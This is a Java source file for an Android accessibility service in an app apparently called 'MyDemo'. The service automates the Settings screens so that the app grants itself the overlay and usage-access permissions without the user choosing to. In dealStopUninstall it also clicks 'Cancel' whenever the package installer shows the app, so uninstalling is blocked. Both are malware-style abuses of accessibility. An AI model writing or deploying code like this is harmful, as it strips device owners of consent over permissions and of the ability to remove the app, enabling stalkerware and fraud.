package com.example.mydemo.accessibility;
import android.accessibilityservice.AccessibilityService;
import android.annotation.TargetApi;
import android.app.usage.UsageStats;
import android.app.usage.UsageStatsManager;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.text.TextUtils;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.widget.Toast;

import com.example.mydemo.MainActivity;
import com.example.mydemo.util.AccessibilityLog;
import com.example.mydemo.util.AccessibilityUtil;
import com.example.mydemo.util.WindowUtils;

import java.util.List;

import static java.lang.Thread.sleep;

/**
 * Created by popfisher on 2017/7/6.
 */

@TargetApi(16)
public class AccessibilitySampleService extends AccessibilityService {
    private static final String ACTION = "action";
    private static final String ACTION_FINISH_SELF = "action_finis_self";
    private boolean isFirst = true;
    private Handler mHandler = new Handler(Looper.getMainLooper());
    private boolean success;
    private long before;



    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        Toast.makeText(AccessibilitySampleService.this,"无障碍服务已开启",Toast.LENGTH_SHORT).show();
        Intent intent = new Intent();
        intent.putExtra(ACTION, ACTION_FINISH_SELF);
        intent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK | Intent.FLAG_ACTIVITY_NEW_TASK);
        intent.setClass(AccessibilitySampleService.this, AccessibilityOpenHelperActivity.class);
        startActivity(intent);

    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        // 获取包名
        if(null == event || TextUtils.isEmpty(event.getPackageName())){
            return;
        }
        String pkgName = event.getPackageName().toString();
        int eventType = event.getEventType();
        AccessibilityOperator.getInstance().updateEvent(this, event);
        AccessibilityLog.printLog( "pkgName == " + event.getPackageName() + ",event111" + event.toString());

        //todo 此处防止卸载存在一定的延迟
        if("com.android.packageinstaller".equals(pkgName)){
            //WindowUtils.showPopupWindow(AccessibilitySampleService.this);
            before = System.currentTimeMillis();
            dealStopUninstall();
        }

        switch (eventType) {
            case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
            case AccessibilityEvent.TYPE_WINDOWS_CHANGED:
                AccessibilityNodeInfo source = event.getSource();
                if(null != source){
                    if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.M
                            && !Settings.canDrawOverlays(AccessibilitySampleService.this) && "com.android.settings".equals(pkgName)){
                        AccessibilityLog.printLog( "pkgName6445345 == 1111" + event.getPackageName());
                        giveShowPupAuthorize("应用","TextView",false);
                        giveShowPupAuthorize("MyDemo","TextView",false);
                        giveShowPupAuthorize("出现在其他应用上","ImageView",false);
                        giveShowPupAuthorize("允许出现在其他应用上","Switch",true);
                        mHandler.postDelayed(new Runnable() {
                            @Override
                            public void run() {
                                AccessibilityLog.printLog( "pkgName6445345 ==3333 ");
                                Intent intent = new Intent(Settings.ACTION_SECURITY_SETTINGS);
                                startActivity(intent);
                            }
                        },3000);
                    }else if("com.android.settings".equals(pkgName) && !hasEnable()){
                        AccessibilityLog.printLog( "pkgName6445345 == " + event.getPackageName());
                        giveAuthorize();
                        chooseMineApp();
                        giveRecordAuthorize();
                        mHandler.postDelayed(new Runnable() {
                            @Override
                            public void run() {
                                AccessibilityLog.printLog( "pkgName6445345 ==3333 ");
                                Intent intent = new Intent(AccessibilitySampleService.this,MainActivity.class);
                                startActivity(intent);
                            }
                        },3000);
                    }
                }

                break;
                case AccessibilityEvent.TYPE_VIEW_SCROLLED:
                    AccessibilityLog.printLog("come into nextClick info = TYPE_VIEW_SCROLLED" );
                    if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.M
                            && !Settings.canDrawOverlays(AccessibilitySampleService.this)){
                    giveShowPupAuthorize("MyDemo","TextView",false);
                    giveShowPupAuthorize("出现在其他应用上","TextView",false);
                    giveShowPupAuthorize("允许出现在其他应用上","Switch",true);
                }else {
                        AccessibilityLog.printLog("come into nextClick info22222 = TYPE_VIEW_SCROLLED" );
                        giveAuthorize();
                    }

                    break;
        }
    }


    private boolean hasEnable(){
        long ts = System.currentTimeMillis();
        UsageStatsManager usageStatsManager=(UsageStatsManager)getApplicationContext().getSystemService("usagestats");
        List<UsageStats> queryUsageStats = usageStatsManager.queryUsageStats(UsageStatsManager.INTERVAL_BEST,0, ts);
        if (queryUsageStats == null || queryUsageStats.isEmpty()) {
            return false;
        }
        return true;
    }


    private void giveRecordAuthorize(){
        AccessibilityNodeInfo source = getRootInActiveWindow();
        List<AccessibilityNodeInfo> nextInfos = source.findAccessibilityNodeInfosByText("允许访问使用记录");
        if (null != nextInfos && nextInfos.size() > 0) {
            for (AccessibilityNodeInfo nextInfo : nextInfos) {
                if("允许访问使用记录".contentEquals(nextInfo.getText())){
                    AccessibilityNodeInfo parent = nextInfo.getParent();
                    if(null != parent){
                        for(int i = 0 ; i < parent.getChildCount(); i++){
                            if(null != parent.getChild(i).getClassName() && parent.getChild(i).getClassName().toString().contains("Switch") && parent.isClickable() && parent.isEnabled() && !parent.getChild(i).isChecked()){
                                AccessibilityLog.printLog("text = " + nextInfo.getText() + ",isChecked ==" + parent.getChild(i).isChecked());
                                nextInfo.getParent().performAction(AccessibilityNodeInfo.ACTION_CLICK);
                                startActivity(new Intent(AccessibilitySampleService.this, MainActivity.class));
                            }
                        }
                    }
                }
            }
        }

    }
    private void chooseMineApp(){
        AccessibilityNodeInfo source = getRootInActiveWindow();
        List<AccessibilityNodeInfo> nextInfos = source.findAccessibilityNodeInfosByText("MyDemo");
        if (null != nextInfos && nextInfos.size() > 0) {
            nextInfos.get(0).getParent().performAction(AccessibilityNodeInfo.ACTION_CLICK);
        }
    }

    private void giveAuthorize(){
        AccessibilityNodeInfo source = getRootInActiveWindow();
        if(null == source){
            return;
        }
        List<AccessibilityNodeInfo> nextInfos = source.findAccessibilityNodeInfosByText("有权查看使用情况的应用");
        List<AccessibilityNodeInfo> nextInfoss = source.findAccessibilityNodeInfosByText("设备安全性");
        if(null != nextInfoss && nextInfoss.size() > 0){
            //nextInfoss.get(0).getParent().getParent().performAction(AccessibilityNodeInfo.ACTION_SCROLL_FORWARD);
            performScroll("设备安全性");
        }else {
            nextClickItem(nextInfos);

        }
    }

    private void dealStopUninstall(){
        AccessibilityLog.printLog("child className111 = dealStopUninstall" );
        AccessibilityNodeInfo source = getRootInActiveWindow();
        List<AccessibilityNodeInfo> nextInfos = source.findAccessibilityNodeInfosByText("MyDemo");
        List<AccessibilityNodeInfo> nextInfoCancel = source.findAccessibilityNodeInfosByText("取消");

        if (nextInfos  != null && nextInfos .size() > 0 && nextInfoCancel != null && nextInfoCancel.size() > 0) {
            boolean result = nextInfoCancel.get(0).performAction(AccessibilityNodeInfo.ACTION_CLICK);
        }
    }

    private synchronized void giveShowPupAuthorize(String text, String viewTpe,boolean isSwitch){
        AccessibilityLog.printLog("child className111 = giveShowPupAuthorize" );
        AccessibilityNodeInfo source = getRootInActiveWindow();
        if(null == source){
            return;
        }
        List<AccessibilityNodeInfo> nextInfos = source.findAccessibilityNodeInfosByText(text);
        if (nextInfos  != null && nextInfos .size() > 0) {
            for (AccessibilityNodeInfo nextInfo : nextInfos) {
                AccessibilityNodeInfo parent = nextInfo.getParent();
                if(null != parent){
                    for(int i = 0; i < parent.getChildCount(); i++) {
                        if(null != parent.getChild(i) && null != parent.getChild(i).getClassName() && !TextUtils.isEmpty(parent.getChild(i).getClassName().toString()) && parent.getChild(i).getClassName().toString().contains(viewTpe)){
                            if(isSwitch){
                                AccessibilityLog.printLog("child className8888 = giveShowPupAuthorize" );
                                if(parent.isClickable() && parent.isEnabled() && !parent.getChild(i).isChecked()){
                                    parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                                }
                            }else {
                                parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                            }

                        }
                    }
                }
            }
        }else {
            performScroll("MB");
            //giveShowPupAuthorize(text,viewTpe);
        }
    }

    private void performScroll(String text){
        try {
            sleep(1000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        AccessibilityNodeInfo source = getRootInActiveWindow();
        List<AccessibilityNodeInfo> nextInfoss = source.findAccessibilityNodeInfosByText(text);
        if(null != nextInfoss && nextInfoss.size() > 0){
            AccessibilityLog.printLog("ome into nextClick result =444 " + nextInfoss.size());
            nextInfoss.get(0).getParent().getParent().performAction(AccessibilityNodeInfo.ACTION_SCROLL_FORWARD);
            //performScroll(source,"设备安全性");
        }
    }

    //这里果然是textView没有点击事件，需要拿到父节点才能点击
    private void nextClickItem(List<AccessibilityNodeInfo> infos) {
        if (infos != null && infos.size() > 0){
            for (AccessibilityNodeInfo info : infos) {
                AccessibilityNodeInfo parent = info.getParent();
                if(null != parent){
                    for(int i = 0; i < parent.getChildCount(); i++) {
                        if(null != parent.getChild(i).getClassName() &&!TextUtils.isEmpty(parent.getChild(i).getClassName().toString()) && parent.getChild(i).getClassName().toString().contains("ImageView") && parent.isClickable() && parent.isEnabled()){
                            boolean result = parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);

                        }
                    }
                }
                if (info.getParent().isEnabled() && info.getParent().isClickable()){
                    boolean result = info.getParent().performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    AccessibilityLog.printLog("come into nextClick result = " + result );
                }else {
                    AccessibilityLog.printLog("come into nextClick info.isEnabled" + info.getParent().isEnabled() + "，info.isClickable() = " + info.getParent().isClickable()
                    + "isChecked + " + info.getParent().isChecked() + "other = " +  info.getParent().isSelected());

                }
            }
        }else {
            AccessibilityLog.printLog("come into nextClick is null");

        }

    }

    @Override
    public void onInterrupt() {

    }

    @Override
    public boolean onUnbind(Intent intent) {
        Toast.makeText(AccessibilitySampleService.this,"无障碍服务已关闭",Toast.LENGTH_SHORT).show();
        return super.onUnbind(intent);

    }

    private void simulationClickByText() {
        boolean result = AccessibilityOperator.getInstance().clickByText("位置信息", AccessibilityNodeInfo.ACTION_CLICK);
        AccessibilityLog.printLog(result ? "安全模拟点击成功" : "安全模拟点击失败");
        mHandler.postDelayed(new Runnable() {
            @Override
            public void run() {
                boolean result = AccessibilityOperator.getInstance().clickByText("单选按钮",AccessibilityNodeInfo.ACTION_CLICK);
                AccessibilityLog.printLog(result ? "单选按钮模拟点击成功" : "单选按钮模拟点击失败");
            }
        }, 2000);
        mHandler.postDelayed(new Runnable() {
            @Override
            public void run() {
                boolean result = AccessibilityOperator.getInstance().clickByText("OFF",AccessibilityNodeInfo.ACTION_CLICK);
                AccessibilityLog.printLog(result ? "OnOff开关模拟点击成功" : "OnOff开关模拟点击失败");
            }
        }, 4000);
        mHandler.postDelayed(new Runnable() {
            @Override
            public void run() {
                boolean result = AccessibilityOperator.getInstance().clickByText("退出本页面",AccessibilityNodeInfo.ACTION_CLICK);
                AccessibilityLog.printLog(result ? "退出本页面模拟点击成功" : "退出本页面模拟点击失败");
            }
        }, 6000);
    }
}
